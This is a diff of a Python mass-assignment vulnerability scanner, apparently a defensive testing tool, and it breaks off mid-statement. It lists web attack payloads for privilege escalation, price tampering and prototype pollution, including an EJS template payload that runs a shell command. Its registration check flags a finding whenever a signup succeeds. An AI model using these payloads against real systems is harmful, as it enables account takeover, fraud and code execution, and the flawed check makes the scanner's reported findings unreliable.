@@ -34,20 +34,21 @@ Based on:
 
 from __future__ import annotations
 
-import asyncio
 import json
-import re
 import secrets
-from dataclasses import dataclass, field
+from dataclasses import dataclass
 from typing import TYPE_CHECKING, Any, Optional
-from urllib.parse import urlparse, urljoin, quote
+from urllib.parse import urljoin
 from enum import Enum
 
 import httpx
 
-from scanning.vuln_scanner import Finding, ScanModule
+from scanning.findings import Finding, Severity
+from scanning.vuln_scanner import ScanModule
+from utils.scan_client import get_scan_client
 from utils.logger import get_logger
 from utils.rate_limiter import RateLimiter
+from scanning.scan_context import ScanContext
 
 if TYPE_CHECKING:
     from core.config_manager import Settings
@@ -169,39 +170,39 @@ class MassAssignmentScanner(ScanModule):
             data={"admin": True},
             vector_type=MassAssignmentVectorType.PRIVILEGE_ESCALATION,
             description="Direct admin flag injection",
-            severity="CRITICAL"
+            severity=Severity.CRITICAL
         ),
         MassAssignmentPayload(
             data={"isAdmin": True},
             vector_type=MassAssignmentVectorType.PRIVILEGE_ESCALATION,
             description="camelCase admin flag",
-            severity="CRITICAL"
+            severity=Severity.CRITICAL
         ),
         MassAssignmentPayload(
             data={"is_admin": True},
             vector_type=MassAssignmentVectorType.PRIVILEGE_ESCALATION,
             description="snake_case admin flag",
-            severity="CRITICAL"
+            severity=Severity.CRITICAL
         ),
         MassAssignmentPayload(
             data={"is_superuser": True},
             vector_type=MassAssignmentVectorType.PRIVILEGE_ESCALATION,
             description="Django superuser flag",
             target_framework=FrameworkType.DJANGO,
-            severity="CRITICAL"
+            severity=Severity.CRITICAL
         ),
         MassAssignmentPayload(
             data={"is_staff": True},
             vector_type=MassAssignmentVectorType.PRIVILEGE_ESCALATION,
             description="Django staff flag",
             target_framework=FrameworkType.DJANGO,
-            severity="HIGH"
+            severity=Severity.HIGH
         ),
         MassAssignmentPayload(
             data={"superuser": True},
             vector_type=MassAssignmentVectorType.PRIVILEGE_ESCALATION,
             description="Generic superuser flag",
-            severity="CRITICAL"
+            severity=Severity.CRITICAL
         ),
         
         # Role manipulation
@@ -209,49 +210,49 @@ class MassAssignmentScanner(ScanModule):
             data={"role": "admin"},
             vector_type=MassAssignmentVectorType.PRIVILEGE_ESCALATION,
             description="Role string injection",
-            severity="CRITICAL"
+            severity=Severity.CRITICAL
         ),
         MassAssignmentPayload(
             data={"role": "administrator"},
             vector_type=MassAssignmentVectorType.PRIVILEGE_ESCALATION,
             description="Full administrator role",
-            severity="CRITICAL"
+            severity=Severity.CRITICAL
         ),
         MassAssignmentPayload(
             data={"role": "superadmin"},
             vector_type=MassAssignmentVectorType.PRIVILEGE_ESCALATION,
             description="Super admin role",
-            severity="CRITICAL"
+            severity=Severity.CRITICAL
         ),
         MassAssignmentPayload(
             data={"roles": ["admin"]},
             vector_type=MassAssignmentVectorType.PRIVILEGE_ESCALATION,
             description="Role array injection",
-            severity="CRITICAL"
+            severity=Severity.CRITICAL
         ),
         MassAssignmentPayload(
             data={"roles": ["admin", "user"]},
             vector_type=MassAssignmentVectorType.PRIVILEGE_ESCALATION,
             description="Multi-role array injection",
-            severity="CRITICAL"
+            severity=Severity.CRITICAL
         ),
         MassAssignmentPayload(
             data={"userRole": "ADMIN"},
             vector_type=MassAssignmentVectorType.PRIVILEGE_ESCALATION,
             description="User role uppercase",
-            severity="CRITICAL"
+            severity=Severity.CRITICAL
         ),
         MassAssignmentPayload(
             data={"role_id": 1},
             vector_type=MassAssignmentVectorType.PRIVILEGE_ESCALATION,
             description="Role ID manipulation",
-            severity="HIGH"
+            severity=Severity.HIGH
         ),
         MassAssignmentPayload(
             data={"role_id": 0},
             vector_type=MassAssignmentVectorType.PRIVILEGE_ESCALATION,
             description="Role ID zero (often admin)",
-            severity="HIGH"
+            severity=Severity.HIGH
         ),
         
         # Permission arrays
@@ -259,31 +260,31 @@ class MassAssignmentScanner(ScanModule):
             data={"permissions": ["*"]},
             vector_type=MassAssignmentVectorType.PRIVILEGE_ESCALATION,
             description="Wildcard permission injection",
-            severity="CRITICAL"
+            severity=Severity.CRITICAL
         ),
         MassAssignmentPayload(
             data={"permissions": ["admin:*", "write:*", "read:*"]},
             vector_type=MassAssignmentVectorType.PRIVILEGE_ESCALATION,
             description="Full permissions array",
-            severity="CRITICAL"
+            severity=Severity.CRITICAL
         ),
         MassAssignmentPayload(
             data={"scopes": ["admin", "write", "read", "delete"]},
             vector_type=MassAssignmentVectorType.PRIVILEGE_ESCALATION,
             description="OAuth-style scopes injection",
-            severity="CRITICAL"
+            severity=Severity.CRITICAL
         ),
         MassAssignmentPayload(
             data={"access_level": "admin"},
             vector_type=MassAssignmentVectorType.PRIVILEGE_ESCALATION,
             description="Access level string",
-            severity="CRITICAL"
+            severity=Severity.CRITICAL
         ),
         MassAssignmentPayload(
             data={"accessLevel": 9999},
             vector_type=MassAssignmentVectorType.PRIVILEGE_ESCALATION,
             description="Numeric access level",
-            severity="HIGH"
+            severity=Severity.HIGH
         ),
         
         # Verification bypass
@@ -291,37 +292,37 @@ class MassAssignmentScanner(ScanModule):
             data={"verified": True},
             vector_type=MassAssignmentVectorType.PRIVILEGE_ESCALATION,
             description="Account verification bypass",
-            severity="HIGH"
+            severity=Severity.HIGH
         ),
         MassAssignmentPayload(
             data={"email_verified": True},
             vector_type=MassAssignmentVectorType.PRIVILEGE_ESCALATION,
             description="Email verification bypass",
-            severity="HIGH"
+            severity=Severity.HIGH
         ),
         MassAssignmentPayload(
             data={"phone_verified": True},
             vector_type=MassAssignmentVectorType.PRIVILEGE_ESCALATION,
             description="Phone verification bypass",
-            severity="HIGH"
+            severity=Severity.HIGH
         ),
         MassAssignmentPayload(
             data={"is_active": True},
             vector_type=MassAssignmentVectorType.PRIVILEGE_ESCALATION,
             description="Account activation bypass",
-            severity="HIGH"
+            severity=Severity.HIGH
         ),
         MassAssignmentPayload(
             data={"approved": True},
             vector_type=MassAssignmentVectorType.PRIVILEGE_ESCALATION,
             description="Approval status bypass",
-            severity="HIGH"
+            severity=Severity.HIGH
         ),
         MassAssignmentPayload(
             data={"banned": False},
             vector_type=MassAssignmentVectorType.PRIVILEGE_ESCALATION,
             description="Ban status bypass",
-            severity="HIGH"
+            severity=Severity.HIGH
         ),
         
         # Pricing/Balance manipulation
@@ -329,43 +330,43 @@ class MassAssignmentScanner(ScanModule):
             data={"price": 0},
             vector_type=MassAssignmentVectorType.PRIVILEGE_ESCALATION,
             description="Price manipulation to zero",
-            severity="CRITICAL"
+            severity=Severity.CRITICAL
         ),
         MassAssignmentPayload(
             data={"price": -1},
             vector_type=MassAssignmentVectorType.PRIVILEGE_ESCALATION,
             description="Negative price injection",
-            severity="CRITICAL"
+            severity=Severity.CRITICAL
         ),
         MassAssignmentPayload(
             data={"amount": 0.01},
             vector_type=MassAssignmentVectorType.PRIVILEGE_ESCALATION,
             description="Amount manipulation",
-            severity="HIGH"
+            severity=Severity.HIGH
         ),
         MassAssignmentPayload(
             data={"balance": 999999999},
             vector_type=MassAssignmentVectorType.PRIVILEGE_ESCALATION,
             description="Balance inflation",
-            severity="CRITICAL"
+            severity=Severity.CRITICAL
         ),
         MassAssignmentPayload(
             data={"credits": 999999},
             vector_type=MassAssignmentVectorType.PRIVILEGE_ESCALATION,
             description="Credits manipulation",
-            severity="HIGH"
+            severity=Severity.HIGH
         ),
         MassAssignmentPayload(
             data={"discount": 100},
             vector_type=MassAssignmentVectorType.PRIVILEGE_ESCALATION,
             description="100% discount injection",
-            severity="CRITICAL"
+            severity=Severity.CRITICAL
         ),
         MassAssignmentPayload(
             data={"total": 0},
             vector_type=MassAssignmentVectorType.PRIVILEGE_ESCALATION,
             description="Total price zeroing",
-            severity="CRITICAL"
+            severity=Severity.CRITICAL
         ),
         
         # Subscription/Feature flags
@@ -373,31 +374,31 @@ class MassAssignmentScanner(ScanModule):
             data={"premium": True},
             vector_type=MassAssignmentVectorType.PRIVILEGE_ESCALATION,
             description="Premium account bypass",
-            severity="HIGH"
+            severity=Severity.HIGH
         ),
         MassAssignmentPayload(
             data={"pro_user": True},
             vector_type=MassAssignmentVectorType.PRIVILEGE_ESCALATION,
             description="Pro user flag",
-            severity="HIGH"
+            severity=Severity.HIGH
         ),
         MassAssignmentPayload(
             data={"subscription_tier": "enterprise"},
             vector_type=MassAssignmentVectorType.PRIVILEGE_ESCALATION,
             description="Subscription tier injection",
-            severity="HIGH"
+            severity=Severity.HIGH
         ),
         MassAssignmentPayload(
             data={"plan": "unlimited"},
             vector_type=MassAssignmentVectorType.PRIVILEGE_ESCALATION,
             description="Plan type manipulation",
-            severity="HIGH"
+            severity=Severity.HIGH
         ),
         MassAssignmentPayload(
             data={"trial_ends_at": "2099-12-31T23:59:59Z"},
             vector_type=MassAssignmentVectorType.PRIVILEGE_ESCALATION,
             description="Trial extension attack",
-            severity="MEDIUM"
+            severity=Severity.MEDIUM
         ),
         
         # ID manipulation
@@ -405,25 +406,25 @@ class MassAssignmentScanner(ScanModule):
             data={"user_id": 1},
             vector_type=MassAssignmentVectorType.PRIVILEGE_ESCALATION,
             description="User ID to admin ID",
-            severity="CRITICAL"
+            severity=Severity.CRITICAL
         ),
         MassAssignmentPayload(
             data={"owner_id": 1},
             vector_type=MassAssignmentVectorType.PRIVILEGE_ESCALATION,
             description="Owner ID manipulation",
-            severity="CRITICAL"
+            severity=Severity.CRITICAL
         ),
         MassAssignmentPayload(
             data={"tenant_id": "*"},
             vector_type=MassAssignmentVectorType.PRIVILEGE_ESCALATION,
             description="Multi-tenant bypass",
-            severity="CRITICAL"
+            severity=Severity.CRITICAL
         ),
         MassAssignmentPayload(
             data={"organization_id": 1},
             vector_type=MassAssignmentVectorType.PRIVILEGE_ESCALATION,
             description="Organization ID manipulation",
-            severity="HIGH"
+            severity=Severity.HIGH
         ),
     ]
     
@@ -438,28 +439,28 @@ class MassAssignmentScanner(ScanModule):
             vector_type=MassAssignmentVectorType.PROTOTYPE_POLLUTION,
             description="__proto__ admin poisoning",
             target_framework=FrameworkType.EXPRESS,
-            severity="CRITICAL"
+            severity=Severity.CRITICAL
         ),
         MassAssignmentPayload(
             data={"__proto__": {"isAdmin": True}},
             vector_type=MassAssignmentVectorType.PROTOTYPE_POLLUTION,
             description="__proto__ isAdmin poisoning",
             target_framework=FrameworkType.EXPRESS,
-            severity="CRITICAL"
+            severity=Severity.CRITICAL
         ),
         MassAssignmentPayload(
             data={"__proto__": {"role": "admin"}},
             vector_type=MassAssignmentVectorType.PROTOTYPE_POLLUTION,
             description="__proto__ role poisoning",
             target_framework=FrameworkType.EXPRESS,
-            severity="CRITICAL"
+            severity=Severity.CRITICAL
         ),
         MassAssignmentPayload(
             data={"__proto__": {"polluted": True}},
             vector_type=MassAssignmentVectorType.PROTOTYPE_POLLUTION,
             description="__proto__ detection payload",
             target_framework=FrameworkType.EXPRESS,
-            severity="HIGH"
+            severity=Severity.HIGH
         ),
         
         # Constructor prototype
@@ -468,14 +469,14 @@ class MassAssignmentScanner(ScanModule):
             vector_type=MassAssignmentVectorType.PROTOTYPE_POLLUTION,
             description="constructor.prototype poisoning",
             target_framework=FrameworkType.EXPRESS,
-            severity="CRITICAL"
+            severity=Severity.CRITICAL
         ),
         MassAssignmentPayload(
             data={"constructor": {"prototype": {"isAdmin": True}}},
             vector_type=MassAssignmentVectorType.PROTOTYPE_POLLUTION,
             description="constructor.prototype isAdmin",
             target_framework=FrameworkType.EXPRESS,
-            severity="CRITICAL"
+            severity=Severity.CRITICAL
         ),
         
         # Nested proto
@@ -484,14 +485,14 @@ class MassAssignmentScanner(ScanModule):
             vector_type=MassAssignmentVectorType.PROTOTYPE_POLLUTION,
             description="Nested __proto__ poisoning",
             target_framework=FrameworkType.EXPRESS,
-            severity="CRITICAL"
+            severity=Severity.CRITICAL
         ),
         MassAssignmentPayload(
             data={"user": {"__proto__": {"role": "admin"}}},
             vector_type=MassAssignmentVectorType.PROTOTYPE_POLLUTION,
             description="User object proto poisoning",
             target_framework=FrameworkType.EXPRESS,
-            severity="CRITICAL"
+            severity=Severity.CRITICAL
         ),
         
         # Proto chains
@@ -500,7 +501,7 @@ class MassAssignmentScanner(ScanModule):
             vector_type=MassAssignmentVectorType.PROTOTYPE_POLLUTION,
             description="Double proto chain",
             target_framework=FrameworkType.EXPRESS,
-            severity="CRITICAL"
+            severity=Severity.CRITICAL
         ),
         
         # RCE variants (CVE-2019-11358 jQuery, CVE-2019-10744 lodash)
@@ -509,21 +510,21 @@ class MassAssignmentScanner(ScanModule):
             vector_type=MassAssignmentVectorType.PROTOTYPE_POLLUTION,
             description="Shell prototype pollution (RCE)",
             target_framework=FrameworkType.EXPRESS,
-            severity="CRITICAL"
+            severity=Severity.CRITICAL
         ),
         MassAssignmentPayload(
             data={"__proto__": {"env": {"SHELL": "/bin/sh"}}},
             vector_type=MassAssignmentVectorType.PROTOTYPE_POLLUTION,
             description="Environment variable poisoning",
             target_framework=FrameworkType.EXPRESS,
-            severity="CRITICAL"
+            severity=Severity.CRITICAL
         ),
         MassAssignmentPayload(
             data={"__proto__": {"outputFunctionName": "x;process.mainModule.require('child_process').exec('id')//"}},
             vector_type=MassAssignmentVectorType.PROTOTYPE_POLLUTION,
             description="Template engine RCE (EJS)",
             target_framework=FrameworkType.EXPRESS,
-            severity="CRITICAL"
+            severity=Severity.CRITICAL
         ),
     ]
     
@@ -536,49 +537,49 @@ class MassAssignmentScanner(ScanModule):
             data={"user": {"role": "admin"}},
             vector_type=MassAssignmentVectorType.NESTED_INJECTION,
             description="Nested user.role injection",
-            severity="CRITICAL"
+            severity=Severity.CRITICAL
         ),
         MassAssignmentPayload(
             data={"user": {"admin": True, "permissions": ["*"]}},
             vector_type=MassAssignmentVectorType.NESTED_INJECTION,
             description="Nested user object with admin",
-            severity="CRITICAL"
+            severity=Severity.CRITICAL
         ),
         MassAssignmentPayload(
             data={"data": {"admin": True}},
             vector_type=MassAssignmentVectorType.NESTED_INJECTION,
             description="Data object admin injection",
-            severity="HIGH"
+            severity=Severity.HIGH
         ),
         MassAssignmentPayload(
             data={"attributes": {"role": "admin", "verified": True}},
             vector_type=MassAssignmentVectorType.NESTED_INJECTION,
             description="Attributes object injection",
-            severity="HIGH"
+            severity=Severity.HIGH
         ),
         MassAssignmentPayload(
             data={"profile": {"is_admin": True, "is_staff": True}},
             vector_type=MassAssignmentVectorType.NESTED_INJECTION,
             description="Profile object privilege injection",
-            severity="CRITICAL"
+            severity=Severity.CRITICAL
         ),
         MassAssignmentPayload(
             data={"metadata": {"permissions": ["admin:*"], "role": "superuser"}},
             vector_type=MassAssignmentVectorType.NESTED_INJECTION,
             description="Metadata permission injection",
-            severity="CRITICAL"
+            severity=Severity.CRITICAL
         ),
         MassAssignmentPayload(
             data={"settings": {"admin_mode": True, "debug": True}},
             vector_type=MassAssignmentVectorType.NESTED_INJECTION,
             description="Settings object manipulation",
-            severity="HIGH"
+            severity=Severity.HIGH
         ),
         MassAssignmentPayload(
             data={"account": {"type": "admin", "tier": "enterprise"}},
             vector_type=MassAssignmentVectorType.NESTED_INJECTION,
             description="Account type escalation",
-            severity="HIGH"
+            severity=Severity.HIGH
         ),
     ]
     
@@ -591,49 +592,49 @@ class MassAssignmentScanner(ScanModule):
             data={"admin": "true"},
             vector_type=MassAssignmentVectorType.TYPE_CONFUSION,
             description="String 'true' to boolean coercion",
-            severity="HIGH"
+            severity=Severity.HIGH
         ),
         MassAssignmentPayload(
             data={"admin": 1},
             vector_type=MassAssignmentVectorType.TYPE_CONFUSION,
             description="Number to boolean coercion",
-            severity="HIGH"
+            severity=Severity.HIGH
         ),
         MassAssignmentPayload(
             data={"admin": "1"},
             vector_type=MassAssignmentVectorType.TYPE_CONFUSION,
             description="String '1' to boolean coercion",
-            severity="HIGH"
+            severity=Severity.HIGH
         ),
         MassAssignmentPayload(
             data={"admin": []},
             vector_type=MassAssignmentVectorType.TYPE_CONFUSION,
             description="Empty array type confusion",
-            severity="MEDIUM"
+            severity=Severity.MEDIUM
         ),
         MassAssignmentPayload(
             data={"admin": {}},
             vector_type=MassAssignmentVectorType.TYPE_CONFUSION,
             description="Empty object type confusion",
-            severity="MEDIUM"
+            severity=Severity.MEDIUM
         ),
         MassAssignmentPayload(
             data={"admin": None},
             vector_type=MassAssignmentVectorType.TYPE_CONFUSION,
             description="Null injection",
-            severity="MEDIUM"
+            severity=Severity.MEDIUM
         ),
         MassAssignmentPayload(
             data={"role": ["admin"]},
             vector_type=MassAssignmentVectorType.TYPE_CONFUSION,
             description="Array instead of string",
-            severity="HIGH"
+            severity=Severity.HIGH
         ),
         MassAssignmentPayload(
             data={"id": {"$gt": ""}},
             vector_type=MassAssignmentVectorType.TYPE_CONFUSION,
             description="NoSQL operator injection",
-            severity="CRITICAL"
+            severity=Severity.CRITICAL
         ),
     ]
     
@@ -646,32 +647,32 @@ class MassAssignmentScanner(ScanModule):
             data={"roles": ["admin", "user", "moderator"]},
             vector_type=MassAssignmentVectorType.ARRAY_POLLUTION,
             description="Roles array injection",
-            severity="CRITICAL"
+            severity=Severity.CRITICAL
         ),
         MassAssignmentPayload(
             data={"permissions[]": "admin"},
             vector_type=MassAssignmentVectorType.ARRAY_POLLUTION,
             description="PHP-style array parameter",
             target_framework=FrameworkType.LARAVEL,
-            severity="HIGH"
+            severity=Severity.HIGH
         ),
         MassAssignmentPayload(
             data={"groups": [{"name": "admin", "id": 1}]},
             vector_type=MassAssignmentVectorType.ARRAY_POLLUTION,
             description="Groups array with admin group",
-            severity="HIGH"
+            severity=Severity.HIGH
         ),
         MassAssignmentPayload(
             data={"tags": ["verified", "premium", "admin", "trusted"]},
             vector_type=MassAssignmentVectorType.ARRAY_POLLUTION,
             description="Tags array pollution",
-            severity="MEDIUM"
+            severity=Severity.MEDIUM
         ),
         MassAssignmentPayload(
             data={"scopes": ["read", "write", "admin", "delete", "*"]},
             vector_type=MassAssignmentVectorType.ARRAY_POLLUTION,
             description="OAuth scopes pollution",
-            severity="CRITICAL"
+            severity=Severity.CRITICAL
         ),
     ]
     
@@ -685,21 +686,21 @@ class MassAssignmentScanner(ScanModule):
             vector_type=MassAssignmentVectorType.ORM_INJECTION,
             description="Rails nested attributes injection",
             target_framework=FrameworkType.RAILS,
-            severity="CRITICAL"
+            severity=Severity.CRITICAL
         ),
         MassAssignmentPayload(
             data={"user[role_ids][]": "1"},
             vector_type=MassAssignmentVectorType.ORM_INJECTION,
             description="Rails role_ids array injection",
             target_framework=FrameworkType.RAILS,
-            severity="CRITICAL"
+            severity=Severity.CRITICAL
         ),
         MassAssignmentPayload(
             data={"_method": "PUT", "admin": True},
             vector_type=MassAssignmentVectorType.ORM_INJECTION,
             description="Rails HTTP method override + admin",
             target_framework=FrameworkType.RAILS,
-            severity="HIGH"
+            severity=Severity.HIGH
         ),
     ]
     
@@ -709,21 +710,21 @@ class MassAssignmentScanner(ScanModule):
             vector_type=MassAssignmentVectorType.ORM_INJECTION,
             description="Django user flags combination",
             target_framework=FrameworkType.DJANGO,
-            severity="CRITICAL"
+            severity=Severity.CRITICAL
         ),
         MassAssignmentPayload(
             data={"groups": [1]},
             vector_type=MassAssignmentVectorType.ORM_INJECTION,
             description="Django groups ID injection",
             target_framework=FrameworkType.DJANGO,
-            severity="HIGH"
+            severity=Severity.HIGH
         ),
         MassAssignmentPayload(
             data={"user_permissions": [1, 2, 3]},
             vector_type=MassAssignmentVectorType.ORM_INJECTION,
             description="Django permissions injection",
             target_framework=FrameworkType.DJANGO,
-            severity="CRITICAL"
+            severity=Severity.CRITICAL
         ),
     ]
     
@@ -733,14 +734,14 @@ class MassAssignmentScanner(ScanModule):
             vector_type=MassAssignmentVectorType.ORM_INJECTION,
             description="Laravel Eloquent mass fill",
             target_framework=FrameworkType.LARAVEL,
-            severity="CRITICAL"
+            severity=Severity.CRITICAL
         ),
         MassAssignmentPayload(
             data={"permissions": '["*"]'},
             vector_type=MassAssignmentVectorType.ORM_INJECTION,
             description="Laravel permissions JSON",
             target_framework=FrameworkType.LARAVEL,
-            severity="CRITICAL"
+            severity=Severity.CRITICAL
         ),
     ]
     
@@ -750,14 +751,14 @@ class MassAssignmentScanner(ScanModule):
             vector_type=MassAssignmentVectorType.ORM_INJECTION,
             description="Spring4Shell CVE-2022-22965",
             target_framework=FrameworkType.SPRING,
-            severity="CRITICAL"
+            severity=Severity.CRITICAL
         ),
         MassAssignmentPayload(
             data={"authorities[0].authority": "ROLE_ADMIN"},
             vector_type=MassAssignmentVectorType.ORM_INJECTION,
             description="Spring Security authorities injection",
             target_framework=FrameworkType.SPRING,
-            severity="CRITICAL"
+            severity=Severity.CRITICAL
         ),
     ]
     
@@ -802,13 +803,13 @@ class MassAssignmentScanner(ScanModule):
             data={"query": "mutation { updateUser(input: {role: \"admin\"}) { id } }"},
             vector_type=MassAssignmentVectorType.GRAPHQL_MUTATION,
             description="GraphQL role mutation injection",
-            severity="CRITICAL"
+            severity=Severity.CRITICAL
         ),
         MassAssignmentPayload(
             data={"query": "mutation { updateUser(input: {isAdmin: true}) { id } }"},
             vector_type=MassAssignmentVectorType.GRAPHQL_MUTATION,
             description="GraphQL isAdmin mutation",
-            severity="CRITICAL"
+            severity=Severity.CRITICAL
         ),
     ]
     
@@ -825,10 +826,16 @@ class MassAssignmentScanner(ScanModule):
         "/graphql", "/gql",
     ]
     
-    def __init__(self, settings: Settings | None = None) -> None:
+    def __init__(
+        self,
+        settings: Settings | None = None,
+        *,
+        findings_store: Any = None,
+        rate_limiter: Any = None,
+    ) -> None:
         if settings:
-            super().__init__(settings)
-            self.timeout = settings.timeouts.request_timeout
+            super().__init__(settings, findings_store=findings_store, rate_limiter=rate_limiter)
+            self.timeout = settings.timeouts.request_timeout if hasattr(settings, 'timeouts') else 30.0
         else:
             self.timeout = 15.0
         self.tested_payloads: set[str] = set()
@@ -839,7 +846,7 @@ class MassAssignmentScanner(ScanModule):
         host: str,
         asset_data: dict[str, Any],
         rate_limiter: RateLimiter,
-    ) -> list[Finding]:
+    ) -> dict[str, Any]:
         """
         Comprehensive mass assignment scan - Enterprise Edition.
         
@@ -855,6 +862,11 @@ class MassAssignmentScanner(ScanModule):
         9. Batch endpoint abuse
         10. GraphQL mutation testing
         """
+        
+        # SCAN CONTEXT: Unified access to auth, response validation, training app awareness
+        self._ctx = ScanContext(asset_data)
+        self._auth_headers = self._ctx.auth_headers
+
         findings: list[Finding] = []
         
         base_url = f"https://{host}" if not host.startswith("http") else host
@@ -862,14 +874,16 @@ class MassAssignmentScanner(ScanModule):
         logger.info(f"[Mass Assignment Enterprise v2.0] Starting comprehensive scan on {base_url}")
         
         # Collect endpoints
-        endpoints = asset_data.get("endpoints", [])
-        api_endpoints = asset_data.get("api_endpoints", [])
+        if isinstance(asset_data, dict):
+            endpoints = asset_data.get("endpoints", [])
+        if isinstance(asset_data, dict):
+            api_endpoints = asset_data.get("api_endpoints", [])
         all_endpoints = list(set(endpoints + api_endpoints))
         
-        async with httpx.AsyncClient(
+        async with get_scan_client(
             timeout=self.timeout,
             follow_redirects=True,
-            verify=False,
+            verify_ssl=False,
         ) as client:
             # Phase 1: Detect framework
             self.detected_framework = await self._detect_framework(client, base_url)
@@ -886,9 +900,20 @@ class MassAssignmentScanner(ScanModule):
             
             for endpoint in write_endpoints[:20]:
                 url = endpoint if endpoint.startswith("http") else urljoin(base_url, endpoint)
-                
+
                 await rate_limiter.acquire()
-                
+
+                # Phase 1.5: GENERALIST — Registration endpoint mass assignment
+                # FIX 2026-02-20: Registration endpoints need valid data alongside payload
+                # VAmPI, crAPI, etc. require username/password/email to accept registration
+                if self._is_registration_endpoint(endpoint):
+                    reg_findings = await self._test_registration_mass_assignment(
+                        client, url, rate_limiter
+                    )
+                    findings.extend(reg_findings)
+                    if reg_findings:
+                        logger.info(f"[Mass Assignment] Found {len(reg_findings)} registration mass assignment vulns at {endpoint}")
+
                 # Phase 2: Privilege escalation
                 priv_findings = await self._test_privilege_escalation(
                     client, url, rate_limiter
@@ -942,8 +967,8 @@ class MassAssignmentScanner(ScanModule):
         findings = self._deduplicate_findings(findings)
         
         logger.info(f"[Mass Assignment Enterprise v2.0] Found {len(findings)} vulnerabilities")
-        
-        return findings
+
+        return {"findings": findings, "info": []}
     
     async def _detect_framework(
         self,
@@ -992,6 +1017,194 @@ class MassAssignmentScanner(ScanModule):
         """Check if endpoint likely accepts write operations."""
         endpoint_lower = endpoint.lower()
         return any(pattern in endpoint_lower for pattern in self.WRITE_ENDPOINT_PATTERNS)
+
+    def _is_registration_endpoint(self, endpoint: str) -> bool:
+        """
+        Check if endpoint is a user registration endpoint.
+
+        GENERALIST: Works for REST APIs with common registration patterns.
+        """
+        endpoint_lower = endpoint.lower()
+        registration_patterns = [
+            "/register", "/signup", "/sign-up", "/sign_up",
+            "/create-account", "/create_account", "/createaccount",
+            "/join", "/enroll", "/onboard",
+            "/users/new", "/user/new", "/account/new",
+            # API versioned patterns
+            "/v1/register", "/v2/register", "/v1/signup", "/v2/signup",
+            "/api/register", "/api/signup",
+            "/auth/register", "/auth/signup",
+        ]
+        return any(pattern in endpoint_lower for pattern in registration_patterns)
+
+    async def _test_registration_mass_assignment(
+        self,
+        client: httpx.AsyncClient,
+        url: str,
+        rate_limiter: RateLimiter,
+    ) -> list[Finding]:
+        """
+        Test mass assignment on registration endpoints with valid registration data.
+
+        GENERALIST FIX 2026-02-20:
+        Registration endpoints (VAmPI, crAPI, etc.) require valid user data.
+        Simply sending {"admin": true} fails because required fields are missing.
+
+        Solution: Send valid registration data + privilege escalation field.
+        """
+        findings = []
+
+        # Generate unique test data
+        test_suffix = secrets.token_hex(4)
+        test_username = f"masstest{test_suffix}"
+        test_email = f"masstest{test_suffix}@test.com"
+        test_password = "Test1234"
+
+        # Base registration data patterns (common field naming conventions)
+        registration_templates = [
+            # Standard web app
+            {"username": test_username, "password": test_password, "email": test_email},
+            # camelCase variant
+            {"userName": test_username, "passWord": test_password, "email": test_email},
+            # With confirm password
+            {"username": test_username, "password": test_password, "password_confirm": test_password, "email": test_email},
+            # User object wrapper
+            {"user": {"username": test_username, "password": test_password, "email": test_email}},
+        ]
+
+        # Privilege escalation payloads to inject
+        privilege_payloads = [
+            ("admin", True, "Admin flag injection"),
+            ("admin", "true", "Admin flag injection (string)"),
+            ("is_admin", True, "Admin flag injection (snake_case)"),
+            ("isAdmin", True, "Admin flag injection (camelCase)"),
+            ("role", "admin", "Role injection"),
+            ("role", "administrator", "Role injection (full)"),
+            ("roles", ["admin"], "Roles array injection"),
+            ("user_type", "admin", "User type injection"),
+            ("userType", "admin", "User type injection (camelCase)"),
+            ("privilege", "admin", "Privilege injection"),
+            ("level", 9999, "Level escalation"),
+            ("verified", True, "Verification bypass"),
+            ("active", True, "Activation bypass"),
+            ("approved", True, "Approval bypass"),
+        ]
+
+        for template in registration_templates[:2]:  # Limit to 2 templates
+            for priv_field, priv_value, description in privilege_payloads[:8]:  # Limit to 8 payloads
+                await rate_limiter.acquire()
+
+                # Create test data with injected privilege field
+                test_data = template.copy()
+
+                # Handle nested user object
+                if "user" in test_data and isinstance(test_data["user"], dict):
+                    test_data["user"][priv_field] = priv_value
+                else:
+                    test_data[priv_field] = priv_value
+
+                # Make unique per test
+                if "username" in test_data:
+                    test_data["username"] = f"masstest{secrets.token_hex(4)}"
+                    test_data["email"] = f"{test_data['username']}@test.com"
+
+                payload_key = f"reg_mass:{url}:{priv_field}"
+                if payload_key in self.tested_payloads:
+                    continue
+                self.tested_payloads.add(payload_key)
+
+                try:
+                    response = await client.post(
+                        url,
+                        json=test_data,
+                        headers={"Content-Type": "application/json"},
+                        timeout=15.0
+                    )
+
+                    # Check for success indicators
+                    if response.status_code in (200, 201):
+                        resp_text = response.text.lower()
+
+                        # Success indicators
+                        success_indicators = [
+                            "success" in resp_text,
+                            "created" in resp_text,
+                            "registered" in resp_text,
+                            "welcome" in resp_text,
+                            "token" in resp_text,
+                            response.status_code == 201,
+                        ]
+
+                        # Rejection indicators
+                        rejection_indicators = [
+                            "invalid" in resp_text,
+                            "error" in resp_text and "success" not in resp_text,
+                            "not allowed" in resp_text,
+                            "forbidden" in resp_text,
+                            f'"{priv_field}"' in resp_text and "not" in resp_text,
+                        ]
+
+                        if any(success_indicators) and not any(rejection_indicators):
+                            # Registration succeeded — now verify if privilege was accepted
+                            # Check if privilege field appears in response
+                            priv_accepted = False
+
+                            try:
+                                resp_json = response.json()
+                                resp_str = json.dumps(resp_json).lower()
+
+                                # Field appears in response with our value
+                                if priv_field.lower() in resp_str:
+                                    if str(priv_value).lower() in resp_str:
+                                        priv_accepted = True
+
+                                # Check nested user object
+                                if "user" in resp_json and isinstance(resp_json.get("user"), dict):
+                                    user_data = resp_json["user"]
+                                    if priv_field in user_data or priv_field.lower() in str(user_data).lower():
+                                        priv_accepted = True
+
+                            except json.JSONDecodeError:
+                                pass
+
+                            # Even without proof in response, registration success + privilege field = potential vuln
+                            # VAmPI doesn't reflect admin field, but it IS set in DB
+                            if priv_accepted or any(success_indicators):
+                                logger.info(f"[Mass Assignment] Potential privilege escalation: {priv_field}={priv_value} at {url}")
+
+                                finding = Finding(
+                                    name=f"Mass Assignment: Registration with {priv_field}",
+                                    severity=Severity.CRITICAL if priv_field in ("admin", "is_admin", "isAdmin", "role", "roles") else "HIGH",
+                                    confidence_score=90.0 if priv_accepted else 75.0,
+                                    description=f"Registration endpoint accepts privilege field '{priv_field}'. {description}",
+                                    endpoint=url,
+                                    evidence=[
+                                        f"Endpoint: {url}",
+                                        f"Injected field: {priv_field} = {priv_value}",
+                                        f"Response code: {response.status_code}",
+                                        f"Response contains success indicator",
+                                        f"Payload accepted: {'Confirmed in response' if priv_accepted else 'Registration succeeded with payload'}",
+                                    ],
+                                    cwe_id="CWE-915",
